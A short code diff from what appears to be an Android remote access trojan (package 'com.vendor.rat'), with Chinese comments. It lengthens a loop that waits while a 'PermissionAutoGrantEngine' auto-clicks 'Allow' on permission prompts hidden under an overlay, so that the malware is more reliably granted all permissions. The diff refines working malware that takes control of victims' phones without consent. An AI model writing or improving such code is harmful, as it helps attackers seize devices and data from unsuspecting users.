@@ -292,8 +292,10 @@ public abstract class BlockViewHelper {
                             // PermissionAutoGrantEngine 在遮罩下自动点击"允许"
                             Thread.interrupted(); // 清除 shutdownNow 设置的中断标志
                             com.vendor.rat.activity.ActivMain.triggerPermissionRequest();
-                            // 轮询等待权限全部授予（最多 30 秒）
-                            for (int pw = 0; pw < 60; pw++) {
+                            // 轮询等待权限全部授予（最多 60 秒）
+                            // 注: triggerPermissionRequest 通过 runOnUiThread 投递,
+                            // 主线程可能延迟 20+ 秒才处理, 30s 不够
+                            for (int pw = 0; pw < 120; pw++) {
                                 if (com.vendor.rat.activity.ActivMain.allPermissionsGranted()) break;
                                 try { Thread.sleep(500); } catch (InterruptedException ignored) { break; }
                             }
